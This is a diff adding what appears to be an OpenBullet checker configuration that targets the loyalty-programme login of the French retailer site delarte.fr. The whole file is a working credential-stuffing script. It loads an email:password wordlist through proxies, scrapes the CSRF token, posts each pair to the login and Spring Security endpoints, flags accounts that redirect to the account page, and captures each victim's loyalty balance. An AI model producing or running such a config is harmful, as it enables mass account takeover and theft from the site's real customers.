@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "DelArte ",
+  "SuggestedBots": 2,
+  "LastModified": "2019-04-23T00:00:42.4819095+02:00",
+  "AdditionalInfo": "",
+  "Author": "ZAK",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_CSRF REQUEST GET "https://www.delarte.fr/ma-fidelite-italienne/login.json" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#PARSE_CSRF PARSE "<SOURCE>" LR "name=\"CSRFToken\" value=\"" "\"" -> VAR "token" 
+
+#REQUEST_LOGIN REQUEST POST "https://www.delarte.fr/ma-fidelite-italienne/login.json" 
+  CONTENT "email=<USER>&j_password=<PASS>&CSRFToken=<token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Origin: https://www.delarte.fr" 
+
+#SECURITY_CHECK REQUEST POST "https://www.delarte.fr/j_spring_security_check" 
+  CONTENT "email=<USER>&j_password=<PASS>&CSRFToken=<token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Origin: https://www.delarte.fr" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" Contains "/mon-compte" 
+  KEYCHAIN Failure OR 
+    KEY "<ADDRESS>" DoesNotContain "/mon-compte" 
+
+#CAPTURE_SOLDE PARSE "<SOURCE>" CSS "div#content div.Greeting-amount > span" "innerHTML" -> CAP "SOLDE" 
+
